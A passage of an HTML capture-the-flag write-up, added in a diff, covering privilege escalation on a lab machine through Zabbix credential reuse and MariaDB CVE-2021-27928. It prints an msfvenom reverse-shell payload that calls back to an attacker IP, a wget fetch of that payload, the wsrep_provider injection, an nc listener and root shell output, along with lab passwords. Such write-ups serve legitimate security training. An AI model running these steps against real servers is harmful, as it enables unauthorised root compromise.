+                <pre><code class="language-plaintext">CMD: UID=0 PID=956 | /usr/bin/ipmi_sim -n -c /etc/ayelow/ipmi_lan.conf -f /etc/ayelow/sim.emu
+CMD: UID=0 PID=953 | /bin/bash /usr/local/bin/ayelow.sh</code></pre>
+
+                <pre><code class="language-bash">cat /usr/local/bin/ayelow.sh</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">#!/bin/bash</span>
+/usr/bin/ipmi_sim -n -c /etc/ayelow/ipmi_lan.conf -f /etc/ayelow/sim.emu</code></pre>
+
+                <p>UDP port 623 is software-simulated by <code>ipmi_sim</code> v1.0.13 running as root. This explains the IPMI behavior observed earlier.</p>
+
+                <p>Testing credential reuse against <code>ipmi-svc</code>: the same Zabbix panel password (<code>ilovepumkinpie1</code>) works for this user. I obtain the user flag via <code>su ipmi-svc</code> or SSH.</p>
+
+                <h2>Privilege Escalation — MariaDB CVE-2021-27928</h2>
+                <p>As <code>ipmi-svc</code>, the Zabbix configuration file is now readable, exposing the database credentials:</p>
+
+                <pre><code class="language-bash">cat /etc/zabbix/zabbix_server.conf | grep DB</code></pre>
+
+                <pre><code class="language-plaintext">DBName=zabbix
+DBUser=zabbix
+<span style="color:#98c379;">DBPassword=bloooarskybluh</span></code></pre>
+
+                <p>I connect to MySQL and explore the tables, but find nothing useful beyond the <code>Admin</code> and <code>guest</code> Zabbix users.</p>
+
+                <p>What is really interesting is the database server version and the user it runs as:</p>
+
+                <pre><code class="language-bash">ps -fauxww | grep sql</code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">root</span>  1116  /bin/sh /usr/bin/mysqld_safe
+<span style="color:#e06c75;">root</span>  1268  \_ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql
+          --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin
+          <span style="color:#98c379;">--user=root</span> --skip-log-error
+          --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock</code></pre>
+
+                <pre><code class="language-plaintext">Server version: <span style="color:#e5c07b;">10.3.25-MariaDB-0ubuntu0.20.04.1</span> Ubuntu 20.04</code></pre>
+
+                <p>MariaDB 10.3.25 running as <code>root</code>. This version is affected by <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15180">CVE-2020-15180</a>, though no public functional exploit exists for it. Further research reveals it's also affected by <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27928">CVE-2021-27928</a>, which does have a public exploit on Exploit-DB: <a href="https://www.exploit-db.com/exploits/49765">https://www.exploit-db.com/exploits/49765</a></p>
+
+                <p>CVE-2021-27928 abuses the fact that the global variable <code>wsrep_provider</code> — which defines the path to a shared object (.so) for the Galera replication cluster — can be modified by a privileged SQL user. By pointing it to a malicious <code>.so</code> file, the MySQL server loads and executes it within its own process context, which in this case runs as <code>root</code>.</p>
+
+                <h3>Generating the Payload</h3>
+                <p>From my machine, I generate a malicious ELF shared object containing a reverse shell using <code>msfvenom</code>:</p>
+
+                <pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.14.142 LPORT=443 \
+  -f elf-so -o CVE-2021-27928.so</code></pre>
+
+                <pre><code class="language-plaintext">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: CVE-2021-27928.so</code></pre>
+
+                <p>I transfer the file to the victim machine via a simple HTTP server:</p>
+
+                <pre><code class="language-bash"># On my machine:
+python3 -m http.server 8080
+
+# On the victim:
+wget http://10.10.14.142:8080/CVE-2021-27928.so -O /tmp/CVE-2021-27928.so</code></pre>
+
+                <h3>Exploitation</h3>
+                <p>A first attempt using the <code>-e</code> flag to execute the statement directly returns a reverse shell, but as the <code>zabbix</code> user (the SQL connection owner), not as root:</p>
+
+                <pre><code class="language-bash">mysql -u zabbix -p -e <span style="color:#98c379;">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
+<span style="color:#e06c75;">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span></code></pre>
+
+                <p>The key is to execute the command from <strong>inside an interactive SQL session</strong>. The MySQL server loads the <code>.so</code> within its own process context (running as <code>root</code>), not the client's. Using <code>-e</code> causes the session to terminate before the shell can establish itself properly. From an interactive session, it works as expected:</p>
+
+                <pre><code class="language-bash">mysql -u zabbix -p
+# (enter password: bloooarskybluh)</code></pre>
+
+                <pre><code class="language-sql">MariaDB [(none)]&gt; <span style="color:#e5c07b;">SET GLOBAL</span> wsrep_provider=<span style="color:#98c379;">"/tmp/CVE-2021-27928.so"</span>;
+<span style="color:#e06c75;">ERROR 2006 (HY000): MySQL server has gone away</span>
+
+No connection. Trying to reconnect...
+Connection id:    15
+Current database: *** NONE ***
+
+<span style="color:#e06c75;">ERROR 2013 (HY000): Lost connection to MySQL server during query</span></code></pre>
+
+                <p>The server crashes as the shared object is loaded — expected exploit behavior. Meanwhile, my listener catches the connection:</p>
+
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.14.142] from (UNKNOWN) [10.129.4.44] 54956
+id
+<span style="color:#98c379;">uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
+
+                <p>Root shell obtained. The root flag is retrieved and the machine is fully compromised.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
